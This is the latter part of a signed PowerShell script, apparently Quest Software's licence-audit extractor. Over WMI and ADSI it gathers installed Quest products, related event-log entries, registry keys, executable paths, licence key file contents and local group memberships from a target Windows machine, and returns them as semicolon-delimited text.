        $obj | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $($reg.GetStringValue($HKLM, $thisKey, "DisplayName").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "QuietDisplayName" -Value $($reg.GetStringValue($HKLM, $thisKey, "QuietDisplayName").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "VersionMajor" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "VersionMajor").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "VersionMinor" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "VersionMinor").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "InstallDate" -Value $($reg.GetStringValue($HKLM, $thisKey, "InstallDate").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "EstimatedSize" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "EstimatedSize").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "Publisher" -Value $($reg.GetStringValue($HKLM, $thisKey, "Publisher").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "InstallLocation" -Value $($reg.GetStringValue($HKLM, $thisKey, "InstallLocation").sValue);     
        	
        if ($obj.DisplayName -eq $null -and $obj.QuietDisplayName -eq $null) {
            continue;
        }	

        $displayName = if ($obj.DisplayName -ne $null) { $obj.DisplayName.ToString(); } else { $obj.QuietDisplayName.ToString(); };
        [bool]$productMatch = $false;

        foreach ($expression in ($ProductNamesExpressions -replace '%', '*')) {
            if ($displayName -like $expression) {
                $productMatch = $true;
            }
        }

        if ($productMatch -eq $false) {
            continue;
        }    

        $strOutput += if ($obj.DisplayName -ne $null) { $obj.DisplayName.ToString() + ";"; } else { $obj.QuietDisplayName.ToString() + ";"; };
        $strOutput += if ($obj.VersionMajor -eq $null) { ";"; } else { $obj.VersionMajor.ToString() + ";"; };
        $strOutput += if ($obj.VersionMinor -eq $null) { ";"; } else { $obj.VersionMinor.ToString() + ";"; };
        $strOutput += if ($obj.InstallDate -eq $null) { ";"; } else { $obj.InstallDate.ToString() + ";"; };
        $strOutput += if ($obj.EstimatedSize -eq $null) { ";"; } else { $obj.EstimatedSize.ToString() + ";"; };
        $strOutput += if ($obj.Publisher -eq $null) { ";"; } else { $obj.Publisher.ToString() + ";"; };
        $strOutput += if ($obj.InstallLocation -eq $null) { ""; } else { $obj.InstallLocation.ToString(); }; 
        $strOutput += [System.Environment]::NewLine;     
    }
    
    return $strOutput;
}

# Extract application events
function Extract-Events([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Time;Message";
    $strOutput += [System.Environment]::NewLine;    

    if ($credentials -eq $null) {
        $wmi_event_info = Get-WmiObject -Class Win32_NTLogEvent -Filter "Logfile = 'Application' AND (EventCode = '1034' OR EventCode = '11724')" `
            -Property TimeWritten, Message, Logfile, EventCode -ComputerName $computerName -ErrorAction Stop |                             
        Select TimeWritten, Message, EventCode;
    }
    else {
        $wmi_event_info = Get-WmiObject -Class Win32_NTLogEvent -Filter "Logfile = 'Application' AND (EventCode = '1034' OR EventCode = '11724')" `
            -Property TimeWritten, Message, Logfile, EventCode -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
        Select TimeWritten, Message, EventCode;
    }
		
    if ($wmi_event_info -ne $null) {        
        foreach ($event in ($wmi_event_info | where { $_.EventCode -eq "1034" })) {
            foreach ($expression in ($ProductNamesExpressions -replace '%', '*')) {
                if ($event.Message -like $expression) {
                    $strOutput += $event.TimeWritten.ToString() + ";";
                    $strOutput += $event.Message -replace '\r', "";
                    $strOutput += [System.Environment]::NewLine;
                }
            }
        }
        foreach ($event in ($wmi_event_info | where { $_.EventCode -eq "11724" })) {
            foreach ($expression in ($ProductNamesExpressions -replace '%', '*')) {
                if ($event.Message -like $expression -and $event.Message -iContains "Removal completed successfully") {
                    $strOutput += $event.TimeWritten.ToString() + ";";
                    $strOutput += $event.Message -replace '\r', "";
                    $strOutput += [System.Environment]::NewLine;
                }
            }
        }
    }
   
    return $strOutput;
}

# Extract Quest registry keys, values and data
function Extract-Registry([string]$computerName, [PSCredential]$credentials) {
	
    $strOutput = "Key;Value;Data";
    $strOutput += [System.Environment]::NewLine;

    foreach ($registryKey in $RegistryKeys) {
        $strOutput += Extract-Key $computerName $credentials $registryKey;
    }
	
    return $strOutput;
}

# Recursively extract all values, data and subkeys at a given key location
function Extract-Key([string]$computerName, [PSCredential]$credentials, [string]$strKey) {

    $strOutput = "";
    $arrValueNames = @();
    $arrValueTypes = @();
    $arrSubKeys = @();
		
    if ($credentials -eq $null) {
        $reg = Get-WmiObject -List -Namespace root\default -ComputerName $computerName -ErrorAction Stop | Where { $_.Name -eq "StdRegProv" };
    }
    else {
        $reg = Get-WmiObject -List -Namespace root\default -ComputerName $computerName -Credential $credentials -ErrorAction Stop | Where { $_.Name -eq "StdRegProv" };
    }
		
    $keys = $reg.EnumValues($HKLM, $strKey);
    if ($keys.sNames -ne $null) {
        $arrValueNames += $keys.sNames;
        $arrValueTypes += $keys.Types;        
    }

    if ($arrValueNames.Count -gt 0) {		
        for ($i = 0; $i -le $arrValueNames.Count; $i++) {
            $strData = "";
            switch ($arrValueTypes[$i]) {
                $REG_SZ {
                    $strData = $reg.GetStringValue($HKLM, $strKey, $arrValueNames[$i]).sValue;
                    break;
                }
                $REG_EXPAND_SZ {
                    $strData = $reg.GetExpandedStringValue($HKLM, $strKey, $arrValueNames[$i]).sValue;
                    break;
                }
                $REG_BINARY {
                    $strData = $reg.GetBinaryValue($HKLM, $strKey, $arrValueNames[$i]).sValue;
                    break;
                }
                $REG_DWORD {
                    $strData = $reg.GetDWORDValue($HKLM, $strKey, $arrValueNames[$i]).sValue;
                    break;
                }
                $REG_MULTI_SZ {
                    $strData = $reg.GetMultiStringValue($HKLM, $strKey, $arrValueNames[$i]).sValue;
                    $strData = [string]::Join($strData, "|");
                    break;
                } 			
            }
            $strOutput += $strKey + ";" + $arrValueNames[$i] + ";" + $strData;
            $strOutput += [System.Environment]::NewLine;
        }
    }		
	
    $subkeys = $reg.EnumKey($HKLM, $strKey);
    if ($subkeys.sNames -ne $null) {        
        $arrSubKeys += $subkeys.sNames;        
    }

    if ($arrSubKeys.Count -gt 0) {
        foreach ($subkey in $arrSubKeys) {
            $strOutput += Extract-Key $computerName $credentials ($strKey + "\" + $subkey)
        }
    }
		
    return $strOutput;
}

# Executable file search
function Search-Executables([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Path;InstallDate;LastAccessed;LastModified";
    $strOutput += [System.Environment]::NewLine;
    
    # Replace any * with % to generate appropriate WQL syntax
    $strQuery = Generate-WQL "FileName" "LIKE" ($ExeFileNamesExpressions) "OR";
	
    # Searching for all local drives to build query string
    $strDrive = "";

    if ($credentials -eq $null) {
        $wmi_disk_info = Get-WmiObject -Class Win32_LogicalDisk -Property DriveType, DeviceID -ComputerName $computerName -ErrorAction Stop | 
        Select DriveType, DeviceID;
    }
    else {
        $wmi_disk_info = Get-WmiObject -Class Win32_LogicalDisk -Property DriveType, DeviceID -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
        Select DriveType, DeviceID;
    }
    
    if ($wmi_disk_info -ne $null) {
        foreach ($disk in $wmi_disk_info) {
            if ($disk.DriveType -eq 3) {
                $strDrive += "Drive = '" + $disk.DeviceID + "' OR ";
            }
        }

        $strDrive = $strDrive.Substring(0, $strDrive.Length - 4);

        # Searching for keywords on all local drives	
        if ($credentials -eq $null) {
            $wmi_file_info = Get-WmiObject -Class CIM_DataFile -Filter "($strQuery) AND (Extension = 'exe') AND ($strDrive)" `
                -Property Name, InstallDate, LastAccessed, LastModified -ComputerName $computerName -ErrorAction Stop | 
            Select Name, InstallDate, LastAccessed, LastModified;
        }
        else {
            $wmi_file_info = Get-WmiObject -Class CIM_DataFile -Filter "($strQuery) AND (Extension = 'exe') AND ($strDrive)" `
                -Property Name, InstallDate, LastAccessed, LastModified -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
            Select Name, InstallDate, LastAccessed, LastModified;
        }	

        if ($wmi_file_info -ne $null) {	
            foreach ($file in $wmi_file_info) {
                $strOutput += $file.Name + ";" + $file.InstallDate + ";" + $file.LastAccessed + ";" + $file.LastModified;
                $strOutput += [System.Environment]::NewLine;
            }
        }
    }

    return $strOutput;	
}

# Read licence file
function Read-File([string]$computerName, [PSCredential]$credentials) {

    $strOutput = "File;Line;Content";
    $strOutput += [System.Environment]::NewLine;

    # Searching for all local drives to build query string
    $strDrive = ""
    if ($credentials -eq $null) {
        $wmi_disk_info = Get-WmiObject -Class Win32_LogicalDisk -Property DriveType, DeviceID -ComputerName $computerName -ErrorAction Stop | 
        Select DriveType, DeviceID;
    }
    else {
        $wmi_disk_info = Get-WmiObject -Class Win32_LogicalDisk -Property DriveType, DeviceID -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
        Select DriveType, DeviceID;
    }
    	
    if ($wmi_disk_info -ne $null) {
        foreach ($disk in $wmi_disk_info) {
            if ($disk.DriveType -eq 3) {
                $strDrive += "Drive = '" + $disk.DeviceID + "' OR ";
            }
        }
        $strDrive = $strDrive.Substring(0, $strDrive.Length - 4);

        $strQuery = "(FileName Like '%license%' and Extension = 'key' and ($strDrive)) or (FileName Like '%QSAuth%' and Extension = 'key' and ($strDrive)) `
                     or (FileName Like '%ProductLicense%' and Extension = 'xml' and ($strDrive)) or (FileName Like '%install%' and Extension = 'key' and ($strDrive))";

        # Searching for licence key files on all local drives
        if ($credentials -eq $null) {
            $wmi_file_info = Get-WmiObject -Class CIM_DataFile -Filter "$strQuery" -Property FileName, Extension, Name -ComputerName $computerName -ErrorAction Stop | 
            Select FileName, Extension, Name;
        }
        else {
            $wmi_file_info = Get-WmiObject -Class CIM_DataFile -Filter "$strQuery" -Property FileName, Extension, Name -ComputerName $computerName `
                -Credential $credentials -ErrorAction Stop | 
            Select FileName, Extension, Name;
        }					
	
        if ($wmi_file_info -ne $null) {
            foreach ($file in $wmi_file_info) {	
                $strOutput += $file.FileName + "." + $file.Extension + ";0;" + $file.Name;
                $strOutput += [System.Environment]::NewLine;

                $strFullName = "\\" + $computerName + "\" + ($file.Name.Replace(":", "$"));
                if ($computerName.ToUpper().Equals($env:COMPUTERNAME.ToUpper())) {
                    $strFullName = $file.Name;
                }
                
                if ([System.IO.File]::Exists("$strFullName")) {
                    $licenceFile = [System.IO.File]::ReadAllLines("$strFullName");  
                    $cnt = 1
                    foreach ($line in $licenceFile) {
                        $strOutput += $file.FileName + "." + $file.Extension + ";" + $cnt + ";" + $line;
                        $strOutput += [System.Environment]::NewLine;
                        $cnt ++;
                    }
                }
            }
        }
    }
	
    return $strOutput;
}

# Extract Recursive Group Membership
# Excludes the "Users" group
function Extract-GroupMembership {
    [cmdletbinding()]
    Param (
        [parameter()]
        [string]$ComputerName,
        [parameter()]
        [PSCredential]$credentials
    )

    function Get-LocalGroup {
        [Cmdletbinding()] 
        Param( 
            [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)] 
            [String[]]$Computername,
            [parameter()]
            [PSCredential]$credentials
        )      
              
        if ($credentials -ne $null) {
            $adsi = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "WinNT://$Computername", $($credentials.UserName), $($credentials.GetNetworkCredential().password)
        }
        else {
            $adsi = [ADSI]"WinNT://$Computername"
        }

        $groups = $adsi.psbase.Children | where { $_.SchemaClassName -eq 'group' }

        return $groups;
    }

    function Get-LocalGroupMember {
        [cmdletbinding()]
        Param (
            [parameter()]
            [System.DirectoryServices.DirectoryEntry]$LocalGroup,
            [parameter()]
            [PSCredential]$credentials
        )
        $GroupData = @();
        try {
            $Members = @($LocalGroup.psbase.Invoke("Members")) | ForEach-Object { ([System.DirectoryServices.DirectoryEntry]$_) };
            $Counter++;
            foreach ($Member in $Members) {                
                try {
                    $Name = $Member.InvokeGet("Name");
                    $Path = $Member.InvokeGet("AdsPath");
                    $Domain = $Path.Split('/')[2];
                    if (($Path -like "*/$ComputerName/*")) { $GroupType = 'Local'; } else { $GroupType = 'Domain'; }            
                    if ($Member.InvokeGet("Class") -eq "group") { $Type = 'Group'; } else { $Type = 'User'; }
                    if ($ComputerName.Contains('.')) { $ComputerName = $ComputerName.Substring(0, $ComputerName.IndexOf('.')); }                        
    
                    $data = New-Object PSObject -Property @{
                        GroupName  = "$ComputerName\$($LocalGroup.Name[0])"
                        Member     = "$Domain\$Name"
                        MemberType = $Type
                    };
    
                    $GroupData += $data;
        
                    if ($Type -eq 'Group') {
                        if ($Counter -lt $Depth) {
                            if ($GroupType -eq 'Local') {
                                if ($Groups[$Name] -notcontains 'Local') {
                                    $Groups[$Name] += , 'Local';
                                    $GroupData += Get-LocalGroupMember $Member $credentials;
                                }
                            }
                            else {
                                if ($Groups[$Name] -notcontains 'Domain') {
                                    $Groups[$Name] += , 'Domain';
                                    $GroupData += Get-DomainGroupMember $Member $Domain $Name $True $credentials;
                                }
                            }
                        }
                    }
                }
                catch {
                    $host.ui.WriteWarningLine(("GLGM {0}" -f $_.Exception.Message));
                }
            }
        }
        catch {
            $host.ui.WriteWarningLine(("GLGM {0}" -f $_.Exception.Message));
        }
    
        return $GroupData;
    }
    
    function Get-DomainGroupMember {
        [cmdletbinding()]
        Param (
            [parameter()]
            $DomainGroup, 
            [parameter()]
            [string]$Domain, 
            [parameter()]
            [string]$NTName, 
            [parameter()]
            [string]$blnNT,
            [parameter()]
            [PSCredential]$credentials
        )
        $GroupData = @();
    
        try {
            if ($blnNT -eq $True) {
                $objNT.InvokeMember("Set", "InvokeMethod", $Null, $Translate, (3, ("{0}{1}" -f $NetBIOSDomain.Trim(), $NTName)));
                $DN = $objNT.InvokeMember("Get", "InvokeMethod", $Null, $Translate, 1);
                $ADGroup = [ADSI]"LDAP://$DN";
            }
            else {
                $DN = $DomainGroup.distinguishedName;
                $ADGroup = $DomainGroup;
            }         
            $Counter++; 
            foreach ($MemberDN In $ADGroup.Member) {
                $MemberGroup = [ADSI]("LDAP://{0}" -f ($MemberDN -replace '/', '\/'));
    
                if ($MemberGroup.Class -eq "group") {
                    $Type = 'Group';
                }
                else { $Type = 'User'; }
    
                $data = New-Object PSObject -Property @{
                    GroupName  = "$Domain\$NTName"
                    Member     = "$Domain\$($MemberGroup.sAMAccountName[0])"
                    MemberType = $Type
                };
    
                $GroupData += $data;
    
                if ($MemberGroup.Class -eq "group") {              
                    if ($Counter -lt $Depth) {
                        if ($Groups[$MemberGroup.name[0]] -notcontains 'Domain') {
                            $Groups[$MemberGroup.name[0]] += , 'Domain';
                            $GroupData += Get-DomainGroupMember $MemberGroup $Domain $MemberGroup.Name[0] $False;
                        }                                                
                    }
                }
            }
        }
        catch {
            $host.ui.WriteWarningLine(("GDGM {0}" -f $_.Exception.Message));
        }
    
        return $GroupData;
    }
    
    [int]$Depth = ([int]::MaxValue);
    
    try {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
        $Root = $Domain.GetDirectoryEntry();
        $Base = ($Root.distinguishedName);
    
        $Script:Translate = New-Object -comObject "NameTranslate";
        $Script:objNT = $Translate.GetType();
    
        $objNT.InvokeMember("Init", "InvokeMethod", $Null, $Translate, (3, $Null)) | Out-Null;    
        $objNT.InvokeMember("Set", "InvokeMethod", $Null, $Translate, (1, "$Base")) | Out-Null;
        [string]$Script:NetBIOSDomain = $objNT.InvokeMember("Get", "InvokeMethod", $Null, $Translate, 3);
    }
    catch { Write-Warning ("{0}" -f $_.Exception.Message); }
    
    $Script:Groups = @{ };
    $Script:Counter = 0;
    $AllGroupData = @();
    
    $localGroups = Get-LocalGroup -Computername $ComputerName -Credential $credentials | Where-Object { $_.Name -ne 'Users' };
    foreach ( $localGroup in $localGroups ) {
        #$ADSIGroup = [ADSI]"WinNT://$ComputerName/$localGroup,group";
        $Script:currentGroup = $localGroup.Name;
        $Groups[$localGroup.Name] += , 'Local';
        $AllGroupData += Get-LocalGroupMember -LocalGroup $localGroup -Credential $credentials;
    }
    
    $strOutput = "GroupName;Member;MemberType";
    $strOutput += [System.Environment]::NewLine;

    foreach ($item in $AllGroupData) {
        if (![string]::IsNullOrWhiteSpace($item.GroupName) -and
            ![string]::IsNullOrWhiteSpace($item.Member) -and
            ![string]::IsNullOrWhiteSpace($item.MemberType)) {
            $strOutput += "$($item.GroupName);$($item.Member);$($item.MemberType)";  
            $strOutput += [System.Environment]::NewLine;    
        }
    } 

    return $strOutput;
}

Write-Host "Beginning Extract. This may take a while. Please wait...";

return main;

# SIG # Begin signature block
# MIINLwYJKoZIhvcNAQcCoIINIDCCDRwCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUPhCmsVmNVoP23a2R1QfhBZ7A
# HRCgggpxMIIFMDCCBBigAwIBAgIQBAkYG1/Vu2Z1U0O1b5VQCDANBgkqhkiG9w0B
# AQsFADBlMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD
# VQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQDExtEaWdpQ2VydCBBc3N1cmVk
# IElEIFJvb3QgQ0EwHhcNMTMxMDIyMTIwMDAwWhcNMjgxMDIyMTIwMDAwWjByMQsw
# CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cu
# ZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFzc3VyZWQgSUQg
# Q29kZSBTaWduaW5nIENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
# +NOzHH8OEa9ndwfTCzFJGc/Q+0WZsTrbRPV/5aid2zLXcep2nQUut4/6kkPApfmJ
# 1DcZ17aq8JyGpdglrA55KDp+6dFn08b7KSfH03sjlOSRI5aQd4L5oYQjZhJUM1B0
# sSgmuyRpwsJS8hRniolF1C2ho+mILCCVrhxKhwjfDPXiTWAYvqrEsq5wMWYzcT6s
# cKKrzn/pfMuSoeU7MRzP6vIK5Fe7SrXpdOYr/mzLfnQ5Ng2Q7+S1TqSp6moKq4Tz
# rGdOtcT3jNEgJSPrCGQ+UpbB8g8S9MWOD8Gi6CxR93O8vYWxYoNzQYIH5DiLanMg
# 0A9kczyen6Yzqf0Z3yWT0QIDAQABo4IBzTCCAckwEgYDVR0TAQH/BAgwBgEB/wIB
# ADAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0lBAwwCgYIKwYBBQUHAwMweQYIKwYBBQUH
# AQEEbTBrMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wQwYI
# KwYBBQUHMAKGN2h0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFz
# c3VyZWRJRFJvb3RDQS5jcnQwgYEGA1UdHwR6MHgwOqA4oDaGNGh0dHA6Ly9jcmw0
# LmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RDQS5jcmwwOqA4oDaG
# NGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RD
# QS5jcmwwTwYDVR0gBEgwRjA4BgpghkgBhv1sAAIEMCowKAYIKwYBBQUHAgEWHGh0
# dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwCgYIYIZIAYb9bAMwHQYDVR0OBBYE
# FFrEuXsqCqOl6nEDwGD5LfZldQ5YMB8GA1UdIwQYMBaAFEXroq/0ksuCMS1Ri6en
# IZ3zbcgPMA0GCSqGSIb3DQEBCwUAA4IBAQA+7A1aJLPzItEVyCx8JSl2qB1dHC06
# GsTvMGHXfgtg/cM9D8Svi/3vKt8gVTew4fbRknUPUbRupY5a4l4kgU4QpO4/cY5j
# DhNLrddfRHnzNhQGivecRk5c/5CxGwcOkRX7uq+1UcKNJK4kxscnKqEpKBo6cSgC
# PC6Ro8AlEeKcFEehemhor5unXCBc2XGxDI+7qPjFEmifz0DLQESlE/DmZAwlCEIy
# sjaKJAL+L3J+HNdJRZboWR3p+nRka7LrZkPas7CM1ekN3fYBIM6ZMWM9CBoYs4Gb
# T8aTEAb8B4H6i9r5gkn3Ym6hU/oSlBiFLpKR6mhsRDKyZqHnGKSaZFHvMIIFOTCC
# BCGgAwIBAgIQB2cN/QEcq2woGGcdZGNT6zANBgkqhkiG9w0BAQsFADByMQswCQYD
# VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGln
# aWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFzc3VyZWQgSUQgQ29k
# ZSBTaWduaW5nIENBMB4XDTE4MTAxNTAwMDAwMFoXDTE5MTAxNjEyMDAwMFowdjEL
# MAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFDASBgNVBAcTC0FsaXNv
# IFZpZWpvMR0wGwYDVQQKExRRdWVzdCBTb2Z0d2FyZSwgSW5jLjEdMBsGA1UEAxMU
# UXVlc3QgU29mdHdhcmUsIEluYy4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
# AoIBAQDM1j6CuZfJhRoq8ZJF8n78u/xRosOPku6LDzlYA0SD+WOI9eOu03hFEZmJ
# oC8NNkGAtRbfMQrJcwvLnbGiTirm3KYjF8BDEdUXef4FRpuLwpsHl9pB4bdfzHSt
# 0EBqOoZkU6qmSUnPaWYss1uT84I3lcoXphvtB5HLnVVzj5U4u09gJN3Te94Jh7p6
# Tm/xNTxMl4KOmVoQHScLM8wWjoPikWIW51oOUQ2IEeyhocyixKOpDpqdM7TvXJ9B
# EkuMcKb/sgz4ItvMH+l2kvgMLFhZwXGfNlVPREIHL2aQx6kHDvmY60w9WeOW8S/5
# 7qhXKeassnQE7VMjhNKRG+KDlnOVAgMBAAGjggHFMIIBwTAfBgNVHSMEGDAWgBRa
# xLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4EFgQU8wwOrC62DSrV+Kz9qvDUcpjV
# wpEwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMHcGA1UdHwRw
# MG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9zaGEyLWFzc3VyZWQt
# Y3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3JsNC5kaWdpY2VydC5jb20vc2hhMi1h
# c3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBDMDcGCWCGSAGG/WwDATAqMCgGCCsG
# AQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAgGBmeBDAEEATCB
# hAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2Vy
# dC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9E
# aWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2lnbmluZ0NBLmNydDAMBgNVHRMBAf8E
# AjAAMA0GCSqGSIb3DQEBCwUAA4IBAQAp0C1oaiAHQZsP7OqIT4xuge3sv2uMbUuk
# MwlCr4EAkuevIo2iFdWDEH3enUfpopXgUEts3BoQyihIfNkJsv53RUM5dHB4G9SE
# zN/Fp5YcaMjSchV8WPm73l/I4xj/VzEmpLvSbK7NCq7A2Kg815wpRjBNlG2gCPRU
# Ci0DAQbrD2vruxj10b+NM6i8gZOnI4mR2kA1ALYHumB6Ulhvw7Y26cNyhxJO1aUU
# czWtfz1ck2LVeLnIFwDFZGW2QHSwTKqGkdS/merJgI7BigEVFTV3YjyRpvbsl6e2
# SPJcQ8BAx3DeQPQWadpWZbx2sV4+mWEF/c5zGLzqWyj5ra9jsZX7MYICKDCCAiQC
# AQEwgYYwcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcG
# A1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGlnaUNlcnQgU0hBMiBB
# c3N1cmVkIElEIENvZGUgU2lnbmluZyBDQQIQB2cN/QEcq2woGGcdZGNT6zAJBgUr
# DgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMx
# DAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkq
# hkiG9w0BCQQxFgQU6Ip57wtKlJAtqZvRdJVq8cOKShYwDQYJKoZIhvcNAQEBBQAE
# ggEAIFY+Y+iSpSKKLE2SYzQ8sLeGNn2SnszFQjKxhN3986jbbHql6AZbVM1Qa90C
# tZQqkEuTBA+7c9HzbrQkyUFjxyT3l2Mc88lv4nps7ISceiGCSZy/wmG6faStu6wx
# pdKd5qlCuejKXapq0j3eQmklWs56BgllBPdVIpTR7sAcdYj1myUumrRAAZTmlLKx
# zUstYVDVj6kcw2ZR1SBBouPgOl2AzOCd4HNd+Rwxokb+MFw4Z4Z6q6mKQo3qCD6z
# wZ/mJFZtg4szvFt3kZb9GuadX1DFoCk1nqE+J/fBeSbflNFUfwtR4n09AxtJDVxn
# uTzWNuJsjRHpxWyJ//NDampvCw==
# SIG # End signature block
